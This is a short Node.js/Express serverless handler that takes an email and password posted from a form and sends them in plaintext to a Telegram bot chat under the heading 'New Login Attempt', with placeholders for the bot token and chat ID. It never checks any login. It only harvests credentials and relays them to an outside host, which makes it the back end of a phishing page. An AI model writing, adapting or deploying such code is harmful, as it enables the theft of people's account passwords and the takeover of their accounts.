// api/submit.js
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Replace these with your actual bot token and chat ID
const telegramBotToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace
const chatId = 'YOUR_CHAT_ID'; // Replace

// Handle POST request
app.post('/api/submit', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    const message = `🚨 New Login Attempt 🚨\n\nEmail: ${email}\nPassword: ${password}`;

    await axios.post(`https://api.telegram.org/bot ${telegramBotToken}/sendMessage`, {
      chat_id: chatId,
      text: message
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error:', error.message);
    return res.status(500).json({ error: 'Failed to process request' });
  }
});

module.exports = app;
